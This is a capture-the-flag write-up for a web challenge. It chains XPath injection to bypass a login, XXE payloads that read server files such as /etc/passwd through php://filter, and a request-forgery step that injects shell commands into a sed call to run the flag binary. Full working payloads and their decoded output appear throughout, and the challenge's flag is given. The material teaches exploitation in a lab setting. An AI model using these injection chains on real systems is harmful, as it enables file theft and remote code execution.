# Extremely Malicious Language

## Challenge
* Category:
* Points: 300

There is a sick [CYBER MAP](http://challenge.acictf.com/problem/45111/) . See if you can gain RCE to execute ./flag!

### Hints
* Stage 1: When a black hat crosses your xpath.
* Stage 2: A dark entity can reveal a lot about your operation.
* Stage 3: Take command of the system.
* Stuck? Check out /src.zip.


## Solution

### Tools
* Web Browser
* https://www.urlencoder.org/
* https://www.base64decode.org/


This was a tough challenge to figure out. There is an awesome video walkthrough on youtube by [John Hammond](https://youtu.be/kiGoOuuXWFI).  He uses XXE to get a reverse shell. It's a really cool method and you should check it out. In this walkthrough, we will just use XXE to give us the flag.

The title of the challenge `Extremely Malicious Language` and the Hints 1. `xpath` and 2. `entity` are strong clues as to what methods we will need to get the flag. The challenge title is a reference to XML, which will be the source of our injections. Hint 1's `xpath` reference is indicating that we will use `xpath injection` to get past the login screen. Hint 2's `entity` reference indicates we will need to research `XML External Entity (XXE) Processing` for our payload that gets the flag.

#### Approach
1. Gain Access
2. Analyze webroot files
3. Craft a workable payload
4. Analyze make.php
5. Craft XXE payload to get the flag


#### Gain Access

Lets get started by loading the challenge in a web browser, http://challenge.acictf.com/problem/45111/. We are presented with a username and password login screen. A quick google search for `XPATH injection` leads us to [OWASP's XPATH Injection](https://owasp.org/www-community/attacks/XPATH_Injection) website. Read through the page. A bit of the way down it suggests some injections for username and password.

Go ahead and try them in the login screen on our challenge
```
Username: blah' or 1=1 or 'a'='a
Password: blah
```

And that worked.

![xml_screen](images/xml_screen.png)


If you click generate, we are taken to the `/genmap.php` endpoint and the countries from the XML are highlighted.

At this point I was stuck for a bit. I was trying a number of XML injection methods from multiple websites and not getting anywhere. This is where `Hint 4` helps. Go ahead and tack `/src.zip` onto the end of the challenge URL and we end up downloading an archive called `src.zip`. This archive contains the webroot directory for the web application.

```
http://challenge.acictf.com/problem/45111/src.zip
```

#### Analyze webroot files

Unzip `src.zip` and we have the following files:
```
webroot/
  |-- funcs.php
  |-- genmap.php
  |-- index.php
  |-- login.php
  |-- logout.php
```

Examine the `login.php` file. Notice it loads the `funcs.php`. If you check that file, you will see a line containing `$myfile = fopen("creds.xml", "r");`. Lets see if that file is exposed. Browse to http://challenge.acictf.com/problem/45111/creds.xml


```xml
<creds>
<link type="text/css" id="dark-mode" rel="stylesheet"/>
<style type="text/css" id="dark-mode-custom-style"/>
<user>admin</user>
<pass/>
</creds>
```

Sweet. We already got in, but now we know the username is `admin` and there is no password.

When you click the `Generate` button, it takes us to the `/genmap.php` endpoint. So lets start by looking at the `genmap.php` file. Lets go line-by-line and decipher what this php file is doing.

This section ensures we give it a `name` parameter in the xml. We see this parameter above in default xml `<name>CYBER MAP</name>`
```php
if (!isset($mapConfig->name)) {
  die("needs &lt;name&gt;");
}
```

The next statement checks for at least one country parameter in the xml. We see these above in the `<country>US</country>` xml.
```php
if (!isset($mapConfig->country)) {
  die("needs at least one &lt;country&gt;");
}
```

This section of php takes all of the countries and puts them into an array. You can read up on php arrays [here](https://www.php.net/manual/en/language.types.array.php).
```php
if (is_string($mapConfig["country"])) {
  $mapConfig["country"] = array($mapConfig["country"]);
}
```

The next `foreach` statement is important. It is going to check that the data entered in the `<country>US</country>` xml tags are only 2 alpha characters (ie `US`, `CN`, `AA`, `BB`, etc). This is important because we probably will not be able to inject much here.
```php
$validated = array();
foreach($mapConfig->country as $country) {
  if (preg_match('/[A-Z]{2}/', $country))
  {
    array_push($validated, $country);
  }
}
```

The next `if` statement checks that at least 1 country is present in the array after the validation above. Thats not important enough to list below. What is **SUPER IMPORTANT** is the php code following that.
```php
$target = "challenge.acictf.com:45111/make.php?country[]=" . join("&country[]=", $validated) . "&name=" . urlencode($mapConfig->name);
$ch = curl_init();
if (!$ch) {
  die('error initializing curl');
}
```

WHOA. There is our first big clue. Let's dig into what `genmap.php` is doing here. First, it is build a URL consisting of the `country` and `name` parameters passed in the xml. Check out the endpoint. It's calling `/make.php`, a script that we do not have in our src.zip webroot archive. The remainder of `genmap.php` is not important to our analysis. It just makes the call out to the `/make.php` endpoint.

#### Craft a workable payload

Let's try some XXE to grab a copy of the `make.php` since we do not have it. First, let's read up on XXE and find some example payloads we can use.

XXE References
* https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files
* https://github.com/payloadbox/xxe-injection-payload-list

We need to test an injection point. Remember our default xml is this:
```xml
<cybermap>
	<name>CYBER MAP</name>
	<country>CN</country>
	<country>US</country>
</cybermap>
```

Based on our analysis of `genmap.php`, we probably cannot inject into the `<country>` tag, so let's try the `<name>` tag. [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability) has a section for detecting the XXE vulnerability. Modify our base XML with their payload. We define our payload in `example` and then place it within the `<name>` tag. Copy our payload and paste it into the xml window and click `Generate`.

```xml
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<cybermap>
	<name>CYBER &example;</name>
	<country>CN</country>
	<country>US</country>
</cybermap>
```

Cool. Our point of inject works. You can look at the browser tab or Right-Click > Inspect and see our page is named `Cyber Doe`

```xml
<title>CYBER Doe</title>
<style>
	body {
		background-color: #00004d;
	}
</style>
```

Now we need to build a payload to grab the `make.php` file for us. Reading further down on the [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files) we see a number of examples for grabbing files like `/etc/passwd`. Let's try that inject and see if it works. Notice our inject name is now `xxe`

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<cybermap>
	<name>CYBER &xxe;</name>
	<country>CN</country>
	<country>US</country>
</cybermap>
```

Hrmm. This returns an error. It could be that we are grabbing a file that contains newlines or carriage-returns and the php script building the page does not like that in the head section. Let's try grabbing a file that contains 1 line. The file `/etc/hostname` most likely is short. Modify the payload to try and grab `/etc/hostname`.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/hostname" >]>
<cybermap>
	<name>CYBER &xxe;</name>
	<country>CN</country>
	<country>US</country>
</cybermap>
```

Our suspicions are confirmed. The payload grabbed the `/etc/hostname` file and returned its contents (challenge.PROD) to the `<title>` tag.
```html
<title>CYBER challenge.PROD
</title>
<style>
	body {
		background-color: #00004d;
	}
</style>
```

Going forward, we will need to make all of our responses a single string with no `\n` or `\r` in them. Again, further down the [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#php-wrapper-inside-xxe) site we find a php wrapper that encodes its contents to base64. This exactly what we will need to return content after our injections. This time we will try to grab a file we know exists in the webroot. Modify the payload to use the `php://filter/convert.base64-encode/resource=` and set the resource to grab as `index.php`

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<cybermap>
	<name>CYBER &xxe;</name>
	<country>CN</country>
	<country>US</country>
</cybermap>
```

Sweet! the `<title>` tag now contains some base64.
```html
<title>CYBER PD9waHAKcmVxdWlyZSAnZnVuY3MucGhwJzsKc2Vzc2lvbl9zdGFydCgpOwo/PgoKPGh0bWw+Cgk8aGVhZD4KCQk8dGl0bGU+Q1lCRVIgTUFQPC90aXRsZT4KCQk8c3R5bGU+CgkJCWJvZHkgewoJCQkJaGVpZ2h0OiAxMDAlOwoJCQkJd2lkdGg6IDEwMCU7CgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDRkOwoJCQl9CgkJPC9zdHlsZT4KCTwvaGVhZD4KCTxib2R5Pgo8P3BocCBpZiAoaXNzZXQoJF9TRVNTSU9OWydhdXRoJ10pICYmICRfU0VTU0lPTlsnYXV0aCddKSA6ID8+Cgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0ibG9nb3V0LnBocCI+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxPR09VVCI+Cgk8L2Zvcm0+Cgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iZ2VubWFwLnBocCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbG9sIiByb3dzPTIwIGNvbHM9MTAwPjxjeWJlcm1hcD4KCTxuYW1lPkNZQkVSIE1BUDwvbmFtZT4KCTxjb3VudHJ5PkNOPC9jb3VudHJ5PgoJPGNvdW50cnk+VVM8L2NvdW50cnk+CjwvY3liZXJtYXA+PC90ZXh0YXJlYT4KCQk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR0VORVJBVEUiPgoJPC9mb3JtPgoJCjw/cGhwIGVsc2UgOiA/PgoJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249ImxvZ2luLnBocCI+CgkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJuYW1lIj4KCQk8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIj4KCQk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTE9HSU4iPgoJPC9mb3JtPgo8P3BocCBlbmRpZiA/PgoJPC9ib2R5Pgo8L2h0bWw+</title>
<style>
	body {
		background-color: #00004d;
	}
</style>
```

Open a browser tab to https://www.base64decode.org/. Copy out the base64 string from the title tag and decode it. It's our index.php!

Now lets change the payload to grab `make.php`
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=make.php"> ]>
<cybermap>
	<name>CYBER &xxe;</name>
	<country>CN</country>
	<country>US</country>
</cybermap>
```

Grab the base64 string and decode it. This time we have a new script! I provided a copy of [make.php](./make.php) as well.

#### Analyze make.php

Let's break `make.php` down like we did with the previous script.

This section is checking to make sure it is being accessed locally and not from your web browser. You can verify this by attempting to browse to http://challenge.acictf.com/problem/45111/make.php. Your browser will time out.
```php
if (isset($_SERVER["HTTP_X_REAL_IP"]) && $_SERVER["HTTP_X_REAL_IP"] != "challenge.acictf.com") {
	die("unauthorized: locals only");
}
```

The important part is the `sed` statement and the following `shell_exec()`. It's taking the country parameters in the url and build an expression and then executing the expression. You can read up on [shell_exec](https://www.php.net/manual/en/function.shell-exec.php). It's documentation says Execute command via shell and return the complete output as a string
```php
$expr = "sed -r -e '1h;2,\$H;$!d;g' -e " .
	"'s/data-id=\"(" .
	join("|", $_GET['country']) .
	")\"(\s+)style=\"fill:#333333/" .
	"data-id=\"\\1\"\\2style=\"fill:#00f200/g' world.svg";
$out = shell_exec($expr);
```

This is BIG! Our new goal is to create a payload that escapes the `sed` statement and executes a command we give it. We can do this by closing the `'s/data-id=` with a `'` and then adding a `;` to start our command.

But first we have to figure out how we can control what is sent to the `make.php` script. Remember that our XML goes through some sanitization in the `genmap.php` script. Well, the very next php-wrapper payload in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#php-wrapper-inside-xxe) gives us an example where the resource is a URL `php://filter/convert.base64-encode/resource=http://10.0.0.3`.

#### Craft XXE payload to get the flag

The idea here is that the xml will send normal content to the `genmap.php` script while we use XXE to call the `make.php` script with our parameters.

Let's start with `ls` to list the contents of the directory the script is running. This took a lot of trial-and-error to get just right. We need to URLencode our payload in the URI. The `country[]=` becomes `country%5B%5D=`. We need to escape the `sed` statement with `';`. Then we add our command `ls`. Finally we close it out with a `#`. You can use the site https://www.urlencoder.org/ to build the payloads. So our statment `country[]='; ls #` becomes `country%5B%5D=%27%3B%20ls%20%23`

Build our new payload likeso. Add it to the xml and click `Generate`
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://challenge.acictf.com:45111/make.php?country%5B%5D=%27%3B%20ls%20%23&name=blarg" >]>
<cybermap>
  <name>CYBER &xxe;</name>
  <country>CN</country>
  <country>US</country>
</cybermap>
```

Grab the resulting base64 and decode it at https://www.base64decode.org/.
```
PGh0bWw+Cgk8aGVhZD4KCQk8dGl0bGU+Ymxhcmc8L3RpdGxlPgoJCTxzdHlsZT4KCQkJYm9keSB7CgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDRkOwoJCQl9CgkJPC9zdHlsZT4KCTwvaGVhZD4KCTxib2R5PgoJCWNyZWRzLnhtbApmbGFnCmZ1bmNzLnBocApnZW5tYXAucGhwCmluZGV4LnBocApsb2dpbi5waHAKbG9nb3V0LnBocAptYWtlLnBocApzcmMuemlwCndvcmxkLnN2ZwoJPC9ib2R5Pgo8L2h0bWw+Cg==
```

It worked and gave us a listing of the directory.
```html
<html>
	<head>
		<title>blarg</title>
		<style>
			body {
				background-color: #00004d;
			}
		</style>
	</head>
	<body>
		creds.xml
flag
funcs.php
genmap.php
index.php
login.php
logout.php
make.php
src.zip
world.svg
	</body>
</html>
```

I tried to `cat flag` in my next payload and did not get a response. Turns out flag is a binary. You can confirm this by building a payload that runs the command `file flag`.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://challenge.acictf.com:45111/make.php?country%5B%5D=%27%3B%20file%20flag%20%23&name=blarg" >]>
<cybermap>
  <name>CYBER &xxe;</name>
  <country>CN</country>
  <country>US</country>
</cybermap>
```

That payload gave me the response `flag: executable, regular file, no read permission`. I would have known this if I paid attention to the challenge and remembered `See if you can gain RCE to execute ./flag!`

So let's build a payload that executes the flag binary with the command `'; ./flag #`. URLEncoded that is `%27%3B%20.%2Fflag%20%23`

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://challenge.acictf.com:45111/make.php?country%5B%5D=%27%3B%20.%2Fflag%20%23&name=blarg" >]>
<cybermap>
  <name>CYBER &xxe;</name>
  <country>CN</country>
  <country>US</country>
</cybermap>
```

Grab the base64 returned in the `<title>` tag.
```
PGh0bWw+Cgk8aGVhZD4KCQk8dGl0bGU+Ymxhcmc8L3RpdGxlPgoJCTxzdHlsZT4KCQkJYm9keSB7CgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDRkOwoJCQl9CgkJPC9zdHlsZT4KCTwvaGVhZD4KCTxib2R5PgoJCUFDSXs5MGY1M2MxYWYzOWRjNDBmZGRjMWQxNWYwNGF9Cgk8L2JvZHk+CjwvaHRtbD4K
```

Decode the base64.
```html
<html>
  <head>
    <title>blarg</title>
    <style>
      body {
        background-color: #00004d;
      }
    </style>
  </head>
  <body>
    ACI{90f53c1af39dc40fddc1d15f04a}
  </body>
</html>
```

**ACI{90f53c1af39dc40fddc1d15f04a}**
